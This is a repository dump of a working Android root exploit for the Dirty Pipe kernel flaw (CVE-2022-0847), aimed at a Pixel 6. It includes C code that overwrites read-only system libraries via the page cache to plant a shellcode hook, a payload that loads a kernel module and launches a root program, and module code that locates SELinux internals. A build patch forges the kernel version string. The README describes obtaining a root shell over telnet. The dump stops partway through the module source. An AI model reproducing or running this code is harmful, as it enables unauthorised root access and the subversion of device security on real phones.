@@ -1,0 +1,1743 @@
+Project Path: arc_gmh5225_DirtyPipe-Android_zm21__j3
+
+Source Tree:
+
+```txt
+arc_gmh5225_DirtyPipe-Android_zm21__j3
+├── Makefile
+├── README.md
+├── dirtypipe-android.c
+├── include.inc
+├── magisk
+│   ├── busybox
+│   ├── magisk
+│   ├── magiskboot
+│   └── magiskinit
+├── modprobe-payload.c
+├── mymod
+│   ├── Makefile
+│   ├── build-script-patch.patch
+│   └── mymod.c
+├── mymod.ko
+├── release.sh
+├── run.bat
+├── run.sh
+├── screenshot1.png
+├── stage1.S
+├── stage2-c.c
+├── stage2-payload-include.S
+├── stage2.S
+├── stage2.lds
+└── startup-root
+
+```
+
+`Makefile`:
+
+```
+CC=aarch64-linux-android31-clang
+CXX=aarch64-linux-android31-clang++
+STRIP=llvm-strip
+CFLAGS=-O2
+ADB=adb
+MYMOD_COPY=../../p6/kernel/out/android-gs-pixel-5.10/dist/mymod.ko
+D=/data/local/tmp
+LI=/system/lib/libldacBT_enc.so
+OBJS=dirtypipe-android.o stage1.o stage2-payload-include.S
+VERSION=1.0.0
+
+build: dirtypipe-android mymod.ko
+
+dirtypipe-android: dirtypipe-android.o Makefile stage1.o stage2-payload-include.S stage2-payload
+	$(CC) $(CFLAGS) -Wall -o $@ dirtypipe-android.o stage1.o stage2-payload-include.S
+
+dirtypipe-android.o: dirtypipe-android.c Makefile
+	$(CC) -Os -c -o $@ $<
+
+stage1.o: stage1.S Makefile include.inc
+	$(CC) -c -o $@ $<
+
+stage2.o: stage2.S Makefile include.inc
+	$(CC) -nostdlib -c -o $@ $<
+
+stage2-c.o: stage2-c.c Makefile
+	$(CC) -Os -nostdlib -c -o $@ $<
+
+stage2: stage2-c.o stage2.o stage2.lds Makefile
+	$(CC) -T stage2.lds -nostdlib -nostartfiles -static -o $@ stage2-c.o stage2.o
+
+# Must be smaller than 4096 bytes
+stage2.text: stage2 Makefile
+	aarch64-linux-gnu-objcopy -O binary -j .text $< $@
+
+# Must be smaller than 4096 bytes
+modprobe-payload: modprobe-payload.c Makefile
+	$(CC) -Os -nostartfiles -o $@ $< -llog
+	$(STRIP) $@
+
+mymod.ko: $(MYMOD_COPY)
+	cp $(MYMOD_COPY) mymod.ko
+
+# Page 1: stage2.text (Up to 1 page)
+# Page 2: modprobe-payload (Up to 1 page)
+# Page 3-6: mymod.ko (Up to 4 page)
+stage2-payload: stage2.text modprobe-payload mymod.ko Makefile
+	test -z "$$(find stage2.text -size +4096c)"
+	test -z "$$(find modprobe-payload -size +4096c)"
+	test -z "$$(find mymod.ko -size +16384c)"
+	cp stage2.text $@
+	truncate -s 4096 $@
+	cat modprobe-payload >> $@
+	truncate -s $(shell echo $$(( 4096 * 2 ))) $@
+	cat mymod.ko >> $@
+	truncate -s $(shell echo $$(( 4096 * 6 ))) $@
+
+stage2-payload-include.o: stage2-payload-include.S stage2-payload Makefile
+	$(CC) -c -o $@ $<
+
+### INSTALL ###
+
+install: dirtypipe-android startup-root magisk/busybox
+	$(ADB) push dirtypipe-android startup-root magisk/busybox $(D)
+	$(ADB) shell chmod 755 $(D)/dirtypipe-android $(D)/startup-root $(D)/busybox
+
+run: install
+	$(ADB) shell $(D)/dirtypipe-android
+
+release: build
+	./release.sh $(VERSION)
+
+
+```
+
+`README.md`:
+
+```md
+# DirtyPipe for Android
+Dirty Pipe (CVE-2022-0847) temporary root PoC for Android.
+
+# Targets
+Currently only run on Pixel 6 with security patch level 2022-02-05.
+Don't use on other devices or other versions. It must crash (reboot).
+
+# How to use
+1. Download binary from release page.
+2. Setup adb (android platform tools).
+3. Launch run.bat (For Windows) or run.sh (For Linux/Mac)
+    - If you get `'adb' is not recognized ...` errors, check to add adb to PATH.
+4. You now get temporary root shell by telnet <Device IP Address> 10847
+
+![Screenshot](/screenshot1.png)
+
+# How to build
+1. Install Android NDK
+2. Set PATH for aarch64-linux-android31-clang
+```
+export PATH=$PATH:$ANDROID\_NDK/toolchains/llvm/prebuilt/linux-x86\_64/bin
+```
+3. Run make
+```
+$ make
+```
+
+# How to build kernel module
+1. Download Pixel 6 kernel source. [Link](https://source.android.com/setup/build/building-kernels)
+2. Put mymod directory on kernel/private/google-modules/
+3. Apply mymod/build-script-patch.patch to kernel/private/gs-google
+4. Run build script
+  
+```
+# For the first build
+$ LTO=thin ./build/build.sh
+# For faster rebuild (skip full rebuild)
+$ SKIP\_MRPROPER=1 SKIP\_DEFCONFIG=1 LTO=thin ./build/build.sh
+```
+  
+# Future work
+- Stop using insecure telnet
+- Make apk
+- Install Magisk
+- Add device support
+
+# Credits
+- https://dirtypipe.cm4all.com/
+
+
+```
+
+`dirtypipe-android.c`:
+
+```c
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <ctype.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include <errno.h>
+
+#ifndef TMP_DIR
+#define TMP_DIR "/data/local/tmp"
+#endif
+#define RUN_INDEX TMP_DIR "/dirtypipe-run-index"
+
+extern char stage1_start[];
+extern char stage1_data[];
+extern uint32_t stage1_len;
+extern char stage1_filename[];
+
+#define STAGE2_PAGES (1 + 1 + 4)
+extern char stage2_payload[];
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+/**
+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
+{
+	if (pipe(p)) abort();
+
+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+	static char buffer[4096];
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		write(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		read(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its "flags", the buffer
+	   will be mergeable */
+}
+
+int overwrite(int p[2], int fd, loff_t offset, const char *data, int data_size) {
+	if (offset % PAGE_SIZE == 0) {
+		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
+		return EXIT_FAILURE;
+	}
+
+	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
+	const loff_t end_offset = offset + (loff_t)data_size;
+	if (end_offset > next_page) {
+		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
+		return EXIT_FAILURE;
+	}
+
+	if(lseek64(fd, 0, SEEK_SET) < 0){
+		perror("lseek64");
+		return EXIT_FAILURE;
+	}
+
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	loff_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0) {
+		perror("splice failed");
+		return EXIT_FAILURE;
+	}
+	if (nbytes == 0) {
+		fprintf(stderr, "short splice\n");
+		return EXIT_FAILURE;
+	}
+
+	/* the following write will not create a new pipe_buffer, but
+	   will instead write into the page cache, because of the
+	   PIPE_BUF_FLAG_CAN_MERGE flag */
+	nbytes = write(p[1], data, data_size);
+	if (nbytes < 0) {
+		perror("write failed");
+		return EXIT_FAILURE;
+	}
+	if ((size_t)nbytes < data_size) {
+		fprintf(stderr, "short write\n");
+		return EXIT_FAILURE;
+	}
+	return 0;
+}
+
+int load_run_index() {
+	int run_index = 0;
+
+	int fd = open(RUN_INDEX, O_RDONLY);
+	if(fd >= 0){
+		char buf[100];
+		read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+
+		buf[sizeof(buf) - 1] = 0;
+		run_index = atoi(buf);
+	}
+
+	if(run_index < 0 || 9999 <= run_index){
+		run_index = 0;
+	}
+
+	fd = open(RUN_INDEX, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if(fd >= 0){
+		char buf[100];
+		sprintf(buf, "%d", run_index + 1);
+		write(fd, buf, strlen(buf));
+		close(fd);
+	}
+
+	return run_index;
+}
+
+/*
+This function is called in /system/bin/init when run setprop command.
+$ llvm-objdump -TC libc++.so
+000000000005a9dc  w   DF .text  0000000000000040 std::__1::basic_streambuf<char, std::__1::char_traits<char> >::basic_streambuf()
+
+Mangled: _ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev
+*/
+
+int main(int argc, char **argv)
+{
+	const char *stage1_lib = "/system/lib64/libc++.so";
+	const char *stage2_lib = "/system/lib/libldacBT_enc.so";
+	size_t data_size;
+	int run_index = load_run_index();
+
+	printf("Run index: %d\n", run_index);
+
+	// Shellcode is placed in empty space on .text
+	// Max size=544 bytes
+	size_t shellcode_offset = 0x000a2de0UL;
+	size_t hook_offset      = 0x0005a9dcUL;
+
+	// Aarch64 branch
+	const uint32_t BRANCH = 0x14000000;
+
+	// Build branch instruction for first instruction of hook target.
+	uint32_t hook_data = BRANCH;
+	uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
+	hook_data |= (shellcode_offset + start_offset - hook_offset) >> 2;
+	int hook_data_size = 4;
+
+	sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
+
+	// Jump back to hook target + 4.
+	uint32_t jmpback = BRANCH;
+	jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
+	*(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;
+
+	printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
+
+	int fd2 = open(stage2_lib, O_RDONLY); // yes, read-only! :-)
+	if (fd2 < 0) {
+		perror("open failed");
+		return EXIT_FAILURE;
+	}
+
+	/* open the input file and validate the specified offset */
+	int fd1 = open(stage1_lib, O_RDONLY); // yes, read-only! :-)
+	if (fd1 < 0) {
+		perror("open failed");
+		return EXIT_FAILURE;
+	}
+
+	/* create the pipe with all flags initialized with
+	   PIPE_BUF_FLAG_CAN_MERGE */
+	int p[2];
+	prepare_pipe(p);
+
+	// Send stage2 first.
+	for(int i = 0; i < STAGE2_PAGES; i++){
+		overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_payload + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
+	}
+	// Send stage1
+	overwrite(p, fd1, shellcode_offset, stage1_data, stage1_len);
+	overwrite(p, fd1, hook_offset, (char*)&hook_data, hook_data_size);
+
+	// Trigger
+	system("setprop a a");
+
+	printf("It worked!\n");
+
+	return EXIT_SUCCESS;
+}
+
+```
+
+`include.inc`:
+
+```inc
+ /**
+  Copyright © 2018 Odzhan. All Rights Reserved.
+
+  Redistribution and use in source and binary forms, with or without
+  modification, are permitted provided that the following conditions are
+  met:
+
+  1. Redistributions of source code must retain the above copyright
+  notice, this list of conditions and the following disclaimer.
+
+  2. Redistributions in binary form must reproduce the above copyright
+  notice, this list of conditions and the following disclaimer in the
+  documentation and/or other materials provided with the distribution.
+
+  3. The name of the author may not be used to endorse or promote products
+  derived from this software without specific prior written permission.
+
+  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
+  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
+  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  POSSIBILITY OF SUCH DAMAGE. */
+
+  // symbolic constants for Linux/AArch64
+
+  .equ BINSH,                0x0068732F6E69622F
+
+  .equ BUFSIZ,               64
+  .equ NULL,                  0
+  .equ SIGCHLD,              17
+        
+  // sched.h
+  .equ CSIGNAL,              0x000000FF // signal mask to be sent at exit
+  .equ CLONE_VM,             0x00000100 // set if VM shared between processes
+  .equ CLONE_FS,             0x00000200 // set if fs info shared between processes
+  .equ CLONE_FILES,          0x00000400 // set if open files shared between processes
+  .equ CLONE_SIGHAND,        0x00000800 // set if signal handlers and blocked signals shared
+  .equ CLONE_PTRACE,         0x00002000 // set if we want to let tracing continue on the child too
+  .equ CLONE_VFORK,          0x00004000 // set if the parent wants the child to wake it up on mm_release
+  .equ CLONE_PARENT,         0x00008000 // set if we want to have the same parent as the cloner
+  .equ CLONE_THREAD,         0x00010000 // Same thread group?
+  .equ CLONE_NEWNS,          0x00020000 // New mount namespace group
+  .equ CLONE_SYSVSEM,        0x00040000 // share system V SEM_UNDO semantics
+  .equ CLONE_SETTLS,         0x00080000 // create a new TLS for the child
+  .equ CLONE_PARENT_SETTID,  0x00100000 // set the TID in the parent
+  .equ CLONE_CHILD_CLEARTID, 0x00200000 // clear the TID in the child
+  .equ CLONE_DETACHED,       0x00400000 // Unused, ignored
+  .equ CLONE_UNTRACED,       0x00800000 // set if the tracing process can't force CLONE_PTRACE
+  .equ CLONE_CHILD_SETTID,   0x01000000 // set the TID in the child
+  .equ CLONE_NEWCGROUP,      0x02000000 // New cgroup namespace
+  .equ CLONE_NEWUTS,         0x04000000 // New utsname namespace
+  .equ CLONE_NEWIPC,         0x08000000 // New ipc namespace
+  .equ CLONE_NEWUSER,        0x10000000 // New user namespace
+  .equ CLONE_NEWPID,         0x20000000 // New pid namespace
+  .equ CLONE_NEWNET,         0x40000000 // New network namespace
+  .equ CLONE_IO,             0x80000000 // Clone io context
+
+  // fcntl.h
+  .equ O_ACCMODE, 00000003
+  .equ O_RDONLY,  00000000
+  .equ O_WRONLY,  00000001
+  .equ O_RDWR,    00000002
+  .equ O_CREAT,   00000100
+  .equ O_EXCL,    00000200
+  .equ O_NOCTTY,  00000400
+  .equ O_TRUNC,   00001000
+  .equ O_APPEND,  00002000
+  .equ O_NONBLOCK,00004000
+  
+  .equ SHUT_RDWR,            2
+
+  .equ STDIN_FILENO,         0
+  .equ STDOUT_FILENO,        1
+  .equ STDERR_FILENO,        2
+
+  .equ AF_UNIX,              1
+  .equ AF_INET,              2
+  .equ SOCK_STREAM,          1
+  .equ SOCK_DGRAM,           2
+  .equ IPPROTO_IP,           0
+
+  // epoll.h
+  .equ EPOLLIN,              0x001
+  .equ EPOLLPRI,             0x002
+  .equ EPOLLOUT,             0x004
+  .equ EPOLLERR,             0x008
+  .equ EPOLLHUP,             0x010
+  .equ EPOLLRDNORM,          0x040
+  .equ EPOLLRDBAND,          0x080
+  .equ EPOLLWRNORM,          0x100
+  .equ EPOLLWRBAND,          0x200
+  .equ EPOLLMSG,             0x400
+  
+  .equ EPOLLEXCLUSIVE,       1 << 28
+  .equ EPOLLWAKEUP,          1 << 29
+  .equ EPOLLONESHOT,         1 << 30
+  .equ EPOLLET,              1 << 31
+
+  .equ EPOLL_CTL_ADD,        1
+  .equ EPOLL_CTL_DEL,        2
+  .equ EPOLL_CTL_MOD,        3
+
+  // Linux/AArch64 system calls
+  .equ SYS_epoll_create1,   20    
+  .equ SYS_epoll_ctl,       21 
+  .equ SYS_epoll_pwait,     22    
+  .equ SYS_dup3,            24
+  .equ SYS_fcntl,           25
+  .equ SYS_statfs,          43
+  .equ SYS_faccessat,       48
+  .equ SYS_chroot,          51
+  .equ SYS_fchmodat,        53
+  .equ SYS_openat,          56
+  .equ SYS_close,           57 
+  .equ SYS_pipe2,           59    
+  .equ SYS_read,            63 
+  .equ SYS_write,           64 
+  .equ SYS_writev,          66
+  .equ SYS_pselect6,        72
+  .equ SYS_ppoll,           73
+  .equ SYS_splice,          76
+  .equ SYS_exit,            93 
+  .equ SYS_futex,           98
+  .equ SYS_kill,           129
+  .equ SYS_reboot,         142
+  .equ SYS_setuid,         146
+  .equ SYS_setsid,         157
+  .equ SYS_uname,          160
+  .equ SYS_getpid,         172
+  .equ SYS_getppid,        173
+  .equ SYS_getuid,         174
+  .equ SYS_getgid,         176 
+  .equ SYS_gettid,         178
+  .equ SYS_socket,         198 
+  .equ SYS_bind,           200 
+  .equ SYS_listen,         201
+  .equ SYS_accept,         202
+  .equ SYS_connect,        203
+  .equ SYS_sendto,         206
+  .equ SYS_recvfrom,       207
+  .equ SYS_setsockopt,     208
+  .equ SYS_getsockopt,     209
+  .equ SYS_shutdown,       210
+  .equ SYS_munmap,         215
+  .equ SYS_clone,          220
+  .equ SYS_execve,         221
+  .equ SYS_mmap,           222
+  .equ SYS_mprotect,       226
+  .equ SYS_wait4,          260
+  .equ SYS_getrandom,      278
+  .equ SYS_memfd_create,   279
+  .equ SYS_access,        1033
+  .equ SYS_init_module,    105
+  .equ SYS_lseek,           62
+
+  .equ EAGAIN,              11
+  .equ SEEK_DATA,            3
+  .equ MAP_SHARED,         0x1
+  .equ MAP_PRIVATE,        0x2
+  .equ PROT_READ,          0x1
+  .equ PROT_WRITE,         0x2
+  .equ PROT_EXEC,          0x4
+
+  // load a 64-bit immediate using MOV
+  .macro movq Xn, imm
+      movz    \Xn,  \imm & 0xFFFF
+      movk    \Xn, (\imm >> 16) & 0xFFFF, lsl 16
+      movk    \Xn, (\imm >> 32) & 0xFFFF, lsl 32
+      movk    \Xn, (\imm >> 48) & 0xFFFF, lsl 48
+  .endm
+
+  // load a 32-bit immediate using MOV
+  .macro movl Wn, imm
+      movz    \Wn,  \imm & 0xFFFF
+      movk    \Wn, (\imm >> 16) & 0xFFFF, lsl 16
+  .endm
+
+  // simulate a push operation
+  .macro push Rn:req
+      str     \Rn, [sp, -16]
+  .endm
+
+  // simulate a pop operation
+  .macro pop R:req
+      ldr     \Rn, [sp], 16
+  .endm
+
+
+```
+
+`modprobe-payload.c`:
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <dlfcn.h>
+#include <ctype.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include <sys/socket.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include <android/log.h>
+#include <sys/syscall.h>
+#include <linux/module.h>
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "modprobe-payload", __VA_ARGS__); }
+
+int _start() {
+	const char *lib_mod = "/vendor/lib/libstagefright_soft_mp3dec.so";
+
+	int fd = open(lib_mod, O_RDONLY);
+
+	int ret = syscall(__NR_finit_module, fd, "", 0);
+	if(ret != 0){
+		// finit_module failed with:
+		// EPERM 1: Not root or not has CAP_SYS_MODULE capability.
+		// ENOEXEC 8: bad module file
+		// EACCES 13: denied by selinux policy. current domain has no load_module permission.
+		// EFAULT 14: module was loaded but something wrong on modifying selinux policy.
+		// ENOMSG 42: ok. mymod returns ENOMSG even if succeed to load.
+		LOGV("Error on finit_module: %s %d %d\n", lib_mod, ret, errno);
+	}else{
+		LOGV("Succeed on finit_module: %s %d\n", lib_mod, ret);
+	}
+	close(fd);
+
+	// If succeed to load module, we now on a permissive domain.
+
+	int fdnull = open("/dev/null", O_RDWR);
+	dup2(fdnull, 0);
+	dup2(fdnull, 1);
+	dup2(fdnull, 2);
+
+	if(fork() == 0){
+		execve("/data/local/tmp/startup-root", 0, 0);
+		LOGV("execve: %d\n", errno);
+		exit(2);
+		return 0;
+	}
+
+	exit(ret);
+}
+
+```
+
+`mymod/Makefile`:
+
+```
+obj-$(CONFIG_MYMOD)		+= mymod.o
+
+KERNEL_SRC ?= /lib/modules/$(shell uname -r)/build
+M ?= $(shell pwd)
+KERNEL_UAPI_HEADERS_DIR ?= $(shell readlink -m ${COMMON_OUT_DIR}/kernel_uapi_headers)
+KBUILD_OPTIONS += CONFIG_MYMOD=m
+
+modules clean modules_install:
+	$(MAKE) -C $(KERNEL_SRC) M=$(M) \
+	$(KBUILD_OPTIONS) \
+	EXTRA_CFLAGS="$(EXTRA_CFLAGS)" \
+	$(@)
+
+
+```
+
+`mymod/build-script-patch.patch`:
+
+```patch
+diff --git a/build.config.slider b/build.config.slider
+index 595b8d75d11a..fb32e8fabe86 100644
+--- a/build.config.slider
++++ b/build.config.slider
+@@ -2,13 +2,16 @@
+ 
+ MAKE_GOALS="$MAKE_GOALS
+ modules
+-google/gs101-a0.dtb
+-google/gs101-b0.dtb
+-google/dtbo.img
+-google/gs101-dpm-eng.dtbo
+-google/gs101-dpm-user.dtbo
+-google/gs101-dpm-userdebug.dtbo
+ "
++MAKE_GOALS="modules"
++
++#google/gs101-a0.dtb
++#google/gs101-b0.dtb
++#google/dtbo.img
++#google/gs101-dpm-eng.dtbo
++#google/gs101-dpm-user.dtbo
++#google/gs101-dpm-userdebug.dtbo
++#"
+ 
+ FILES="
+ arch/arm64/boot/dts/google/gs101-a0.dtb
+@@ -18,12 +21,13 @@ arch/arm64/boot/dts/google/gs101-dpm-eng.dtbo
+ arch/arm64/boot/dts/google/gs101-dpm-user.dtbo
+ arch/arm64/boot/dts/google/gs101-dpm-userdebug.dtbo
+ "
++FILES=""
+ 
+-if [ -z "$MIXED_BUILD" ]; then
+-FILES="$FILES
+-$DEVICE_KERNEL_FILES
+-"
+-fi
++#if [ -z "$MIXED_BUILD" ]; then
++#FILES="$FILES
++#$DEVICE_KERNEL_FILES
++#"
++#fi
+ 
+ MODULES_LIST=${KERNEL_DIR}/vendor_boot_modules.slider
+ 
+@@ -58,3 +62,16 @@ private/google-modules/power/reset
+ private/google-modules/bluetooth/broadcom
+ private/google-modules/nfc
+ "
++EXT_MODULES="
++private/google-modules/mymod
++"
++
++POST_DEFCONFIG_CMDS="update_debug_config"
++function update_debug_config() {
++    ${KERNEL_DIR}/scripts/config --file ${OUT_DIR}/.config \
++         --set-str CONFIG_LOCALVERSION "-g0d8fb02914e6-ab8042715" \
++         -e CFI \
++         -e CFI_CLANG
++    (cd ${OUT_DIR} && \
++     make O=${OUT_DIR} $archsubarch CC=${CC} CROSS_COMPILE=${CROSS_COMPILE} olddefconfig)
++}
+diff --git a/scripts/setlocalversion b/scripts/setlocalversion
+index 3f8a8ee14b10..31e71a2a9640 100755
+--- a/scripts/setlocalversion
++++ b/scripts/setlocalversion
+@@ -53,6 +53,8 @@ scm_version()
+ {
+ 	local short
+ 	short=false
++	echo "g0d8fb02914e6"
++	return
+ 
+ 	cd "$srctree"
+ 	if test -e .scmversion; then
+@@ -77,7 +79,7 @@ scm_version()
+ 			# If only the short version is requested, don't bother
+ 			# running further git commands
+ 			if $short; then
+-				echo "+"
++				echo ""
+ 				return
+ 			fi
+ 			# If we are past a tagged commit (like
+@@ -198,11 +200,13 @@ fi
+ 
+ # CONFIG_LOCALVERSION and LOCALVERSION (if set)
+ res="${res}${CONFIG_LOCALVERSION}${LOCALVERSION}"
++res="-g0d8fb02914e6-ab8042715"
+ 
+ # scm version string if not at a tagged commit
+ if test "$CONFIG_LOCALVERSION_AUTO" = "y"; then
+ 	# full scm version string
+-	res="$res$(scm_version)"
++	#res="$res$(scm_version)"
++	res="$res"
+ else
+ 	# append a plus sign if the repository is not in a clean
+ 	# annotated or signed tagged state (as git describe only
+@@ -210,7 +214,7 @@ else
+ 	# LOCALVERSION= is not specified
+ 	if test "${LOCALVERSION+set}" != "set"; then
+ 		scm=$(scm_version --short)
+-		res="$res${scm:++}"
++		#res="$res${scm:++}"
+ 	fi
+ fi
+ 
+
+```
+
+`mymod/mymod.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/moduleparam.h>
+#include <linux/seq_file.h>
+#include <linux/kallsyms.h>
+#include <linux/ftrace.h>
+#include <linux/version.h>
+#include <linux/skbuff.h>
+#include <linux/types.h>
+#include <linux/cred.h>
+#include <net/inet_sock.h>
+#include <linux/securebits.h>
+#include <linux/user_namespace.h>
+#include <linux/prctl.h>
+#include <linux/security.h>
+#include <linux/kprobes.h>
+#include <linux/cred.h>
+#include <linux/lsm_hooks.h>
+#include <linux/rcupdate.h>
+
+struct ebitmap;
+
+// Dummy
+struct policydb {};
+
+struct selinux_policy {
+	struct sidtab *sidtab;
+	// only need offset of policydb
+	struct policydb policydb;
+	//struct selinux_map map;
+	//u32 latest_granting;
+} __randomize_layout;
+
+#define __POLICYDB_CAPABILITY_MAX 7
+struct selinux_state {
+#ifdef CONFIG_SECURITY_SELINUX_DISABLE
+	bool disabled;
+#endif
+#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
+	bool enforcing;
+#endif
+	bool checkreqprot;
+	bool initialized;
+	bool policycap[__POLICYDB_CAPABILITY_MAX];
+	bool android_netlink_route;
+	bool android_netlink_getneigh;
+
+	struct page *status_page;
+	struct mutex status_lock;
+
+	struct selinux_avc *avc;
+	struct selinux_policy __rcu *policy;
+	struct mutex policy_mutex;
+} __randomize_layout;
+
+struct task_security_struct {
+	u32 osid;		/* SID prior to last execve */
+	u32 sid;		/* current SID */
+	u32 exec_sid;		/* exec SID */
+	u32 create_sid;		/* fscreate SID */
+	u32 keycreate_sid;	/* keycreate SID */
+	u32 sockcreate_sid;	/* fscreate SID */
+} __randomize_layout;
+
+struct context {
+	u32 user;
+	u32 role;
+	u32 type;
+	u32 len;        /* length of string in bytes */
+	//struct mls_range range;
+	char range[48];
+	char *str;	/* string representation if context cannot be mapped. */
+};
+
+struct sidtab_entry {
+	u32 sid;
+	u32 hash;
+	struct context context;
+#if CONFIG_SECURITY_SELINUX_SID2STR_CACHE_SIZE > 0
+	struct sidtab_str_cache __rcu *cache;
+#endif
+	struct hlist_node list;
+};
+
+
+struct selinux_state *selinux_state_ = NULL;
+
+int (*security_context_to_sid_)(struct selinux_state *state,
+			    const char *scontext, u32 scontext_len,
+			    u32 *out_sid, gfp_t gfp) = NULL;
+
+int (*ebitmap_set_bit_)(struct ebitmap *e, unsigned long bit, int value) = NULL;
+struct sidtab_entry *(*sidtab_search_entry_)(struct sidtab *s, u32 sid) = NULL;
+struct lsm_blob_sizes *selinux_blob_sizes_ = NULL;
+
+// https://github.com/c-sh0/lkm_ftrace_example/blob/main/inet_bind_mod.c
+
+static int kallsyms_walk_callback(void *data, const char *name, struct module *mod, unsigned long addr) {
+	if(mod) {
+		return 0;
+	}
+
+	if(strcmp(name, "selinux_state") == 0) {
+		selinux_state_ = (struct selinux_state *)addr;
+	}else if(strcmp(name, "security_context_to_sid") == 0) {
+		security_context_to_sid_ = (typeof(security_context_to_sid_))addr;
+	}else if(strcmp(name, "selinux_blob_sizes") == 0) {
+		selinux_blob_sizes_ = (struct lsm_blob_sizes *)addr;
+	}else if(strcmp(name, "ebitmap_set_bit") == 0) {
+		ebitmap_set_bit_ = (typeof(ebitmap_set_bit_))addr;
+	}else if(strcmp(name, "sidtab_search_entry") == 0) {
+		sidtab_search_entry_ = (typeof(sidtab_search_entry_))addr;
+	}
+
+	return 0;
+}
+
+static int __init mymod_init(void) {
+	int rc = 0;
+
+	pr_info("mymod_init: called!\n");
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+	static struct kprobe kp = {
+		.symbol_name = "kallsyms_on_each_symbol"
+	};
+
+	typedef int (*kallsyms_on_each_symbol_t)(int (*fn)(void *, const char *, struct module *, unsigned long), void *data);
+	kallsyms_on_each_symbol_t kallsyms_on_each_symbol;
+
+	rc = register_kprobe(&kp);
+	if(rc < 0) {
+		pr_info("mymod_init: register_kprobe failed: %d\n", rc);
+		return rc;
+	}
+	pr_info("mymod_init: register_kprobe: %d\n", rc);
+
+	kallsyms_on_each_symbol = (kallsyms_on_each_symbol_t) kp.addr;
+	unregister_kprobe(&kp);
+#endif
+	pr_info("mymod_init: kallsyms_on_each_symbol : 0x%lx\n", (unsigned long)kallsyms_on_each_symbol);
+
+	/* walk /proc/kallsyms */
+	rc = kallsyms_on_each_symbol(kallsyms_walk_callback, NULL);
+	pr_info("mymod_init: kallsyms_on_each_symbol returned: %d\n", rc);
+	if(rc) {
+	  	return rc;
+	}
+
+	/* if not found, exit with `Bad address` */
